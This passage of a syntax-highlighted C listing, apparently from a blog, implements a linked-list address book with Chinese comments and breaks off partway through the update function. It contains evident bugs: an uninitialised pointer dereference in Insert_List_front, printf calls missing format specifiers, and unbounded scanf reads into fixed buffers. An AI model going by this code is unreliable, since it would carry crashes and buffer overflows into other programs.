class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">phone</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];  <span class="comment">//编号</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>]; <span class="comment">//姓名</span></span><br><span class="line">    <span class="keyword">char</span> sex[<span class="number">5</span>];  <span class="comment">//性别</span></span><br><span class="line">    <span class="keyword">char</span> tele[<span class="number">20</span>];<span class="comment">//电话</span></span><br><span class="line">    <span class="keyword">char</span> add[<span class="number">30</span>]; <span class="comment">//住址</span></span><br><span class="line">    <span class="keyword">char</span> group[<span class="number">20</span>];<span class="comment">//分组</span></span><br><span class="line">&#125;Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">List</span>&#123;</span></span><br><span class="line">    Person data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">List</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;List;</span><br><span class="line"></span><br><span class="line">List *L = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一、初始化通讯录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    L = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始化通讯录成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二、创建 通讯录（前插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Creat_List_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *node;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;<span class="comment">// 插入 记录 计数</span></span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;<span class="comment">//作为是否继续录入的标志</span></span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;录入第%d条记录：\n&quot;</span>,count);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">        <span class="comment">//判断 ID 是否重复</span></span><br><span class="line">        List *p = L-&gt;next;  <span class="comment">//由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p-&gt;data.ID,node-&gt;data.ID) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新进行输入！\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                p = p-&gt;next;   <span class="comment">//遍历所有元素进行比较</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.name));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.sex));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.tele));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.add));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.group));</span><br><span class="line">        <span class="comment">//前插</span></span><br><span class="line">        node-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = node;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是否继续录入？（1.继续 0.完成录入）&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//三、创建 通讯录（尾插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Creat_List_behind</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *node,*tail;</span><br><span class="line">    tail = L;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;录入第%d条记录：\n&quot;</span>,count);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">        <span class="comment">//判断 ID 是否重复</span></span><br><span class="line">        List *p = L-&gt;next;  <span class="comment">//由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p-&gt;data.ID,node-&gt;data.ID) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新进行输入！\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                p = p-&gt;next;   <span class="comment">//遍历所有元素进行比较</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.name));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.sex));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.tele));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.add));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.group));</span><br><span class="line">        <span class="comment">//尾插</span></span><br><span class="line">        tail-&gt;next = node;</span><br><span class="line">        node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        tail = node;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是否继续录入？（1.继续 0.完成录入）&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">        <span class="keyword">if</span>(flag == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//四、删除记录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dele_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p = L-&gt;next;</span><br><span class="line">    List *q = L;  <span class="comment">//使 q 始终指向 p 的前一个结点</span></span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要删除的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;  <span class="comment">//查找 需要删除的节点位置 p</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p)&#123;</span><br><span class="line">        q-&gt;next = p-&gt;next;<span class="comment">//删除 p 所指结点</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;删除成功！\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;您所删除的信息是：\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>,p-&gt;data.ID);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>,p-&gt;data.sex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>,p-&gt;data.tele);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>,p-&gt;data.add);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>,p-&gt;data.group);</span><br><span class="line">        <span class="built_in">free</span>(p);<span class="comment">//释放空间</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在此人信息！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//五、插入记录（前插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_List_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p,*q,*r,*node;</span><br><span class="line">    p = p-&gt;next;</span><br><span class="line">    q = L;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要插入的记录 ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        q = q-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入结点信息：\n&quot;</span>);</span><br><span class="line">judge:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line"><span class="comment">//判断 ID 是否重复</span></span><br><span class="line">r = L-&gt;next;</span><br><span class="line"><span class="keyword">while</span>(r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID,node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">r = r-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">        <span class="keyword">if</span>(r != <span class="literal">NULL</span>) <span class="comment">//ID 重复</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> judge;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.name));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.sex));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.tele));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.add));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.group));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//如果没有该ID</span></span><br><span class="line"><span class="keyword">int</span> select1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;通讯录中未找到该ID,是否使用默认方式将新节点插入到最后(1.是 0.否)：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;select1);</span><br><span class="line"><span class="keyword">if</span> (select1 == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//给新节点分配空间</span></span><br><span class="line">node = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line"><span class="comment">//给新节点输入数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">judge1:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line"><span class="comment">//判断ID是否重复</span></span><br><span class="line">r = L-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">r = r-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (r != <span class="literal">NULL</span>) <span class="comment">//ID重复</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID重复,请重新输入!\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> judge1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">node-&gt;next = q-&gt;next;</span><br><span class="line">q-&gt;next = node;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;插入成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//六、插入记录（尾插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Insert_List_behind</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">List *p, *r, *q, *node;</span><br><span class="line">p = L-&gt;next;</span><br><span class="line">q = L;</span><br><span class="line"><span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的位置(输入该位置的ID)：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;ID);</span><br><span class="line"><span class="keyword">while</span> (p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">q = q-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//为新节点分配空间</span></span><br><span class="line">node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line"><span class="comment">//为新节点输入数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">judge:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line"><span class="comment">//判断ID是否重复</span></span><br><span class="line">r = L-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">r = r-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> judge;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">node-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next = node;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;插入成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//通讯录中未找到该ID</span></span><br><span class="line"><span class="keyword">int</span> select2;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;通讯录中未找到该ID,是否使用默认方式将该节点插入到最后(1.是 0.否)：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;select2);</span><br><span class="line"><span class="keyword">if</span> (select2 == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//为新节点分配空间</span></span><br><span class="line">node = (List *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line"><span class="comment">//为新节点录入信息</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;请输入新节点信息：\n&quot;</span>);</span><br><span class="line">judge1:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.ID));</span><br><span class="line"><span class="comment">//判断ID是否重复</span></span><br><span class="line">r = L-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (r &amp;&amp; <span class="built_in">strcmp</span>(r-&gt;data.ID, node-&gt;data.ID) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">r = r-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (r != <span class="literal">NULL</span>) <span class="comment">//ID重复</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新输入！\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> judge1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.name));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;性别：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.sex));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;电话：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.tele));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.add));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;分组：&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, &amp;(node-&gt;data.group));</span><br><span class="line">node-&gt;next = q-&gt;next;</span><br><span class="line">q-&gt;next = node;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (select2 == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//七、修改通讯录记录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要修改的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)&#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">int</span> select;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请输入需要修改的属性：（1.姓名 2.性别 3.电话 4.住址 5.分组）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的姓名：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.name));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的性别：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.sex));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的电话：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.tele));</span><br><span 